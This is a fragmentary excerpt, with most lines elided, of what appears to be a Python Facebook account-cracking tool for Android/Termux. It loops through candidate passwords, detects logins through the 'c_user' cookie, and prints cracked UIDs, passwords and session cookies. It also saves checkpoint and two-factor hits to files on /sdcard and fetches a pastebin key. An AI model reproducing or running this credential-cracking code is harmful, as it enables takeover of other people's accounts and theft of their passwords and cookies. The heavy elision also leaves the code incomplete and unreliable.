...
os.system('am start https://www.facebook.com/profile.php?id=100087853867503&mibextid=ZbWKwL')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100087853867503&mibextid=ZbWKwL")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/MXqyffDg").text
...

  ...
  FACEBOOK :   abdlrhman
  GITHUB    :   #####
  LIFE STATUS  :   abdlrhman
  FB GROUP  : abdlrhman0001
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m abdlrhman   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  abdlrhman   \033[0;m]")
    print(f"")
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[abdlrhman-OK😁]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[abdlrhman-CP😭]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/abdlrhman-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/abdlrhman-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[abdlrhman ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
